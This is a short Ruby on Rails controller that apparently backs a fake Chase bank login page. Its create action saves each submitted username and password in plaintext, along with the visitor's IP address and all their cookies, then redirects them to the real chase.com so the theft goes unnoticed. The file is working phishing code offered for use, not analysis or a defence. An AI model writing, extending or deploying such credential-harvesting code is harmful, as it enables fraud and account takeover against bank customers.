class ChaseloginsController < InheritedResources::Base
  protect_from_forgery with: :exception

  layout "chase"

  def new
    @chaselogin = Chaselogin.new
  end

  def create
    @chaselogin = Chaselogin.new(
      username: params[:username],
      password: params[:password],
      ip_address: request.remote_ip,
      cookies: cookies.to_json,
      cookies_text: cookies.map { |k, v| "#{k}: #{v}" }.join(", ")
    )

    if @chaselogin.save
      redirect_to "https://www.chase.com", notice: "Login submitted successfully."
    else
      render :new, status: :unprocessable_entity
    end
  end

  private

  def chaselogin_params
    params.require(:chaselogin).permit(:username, :password)
  end
end
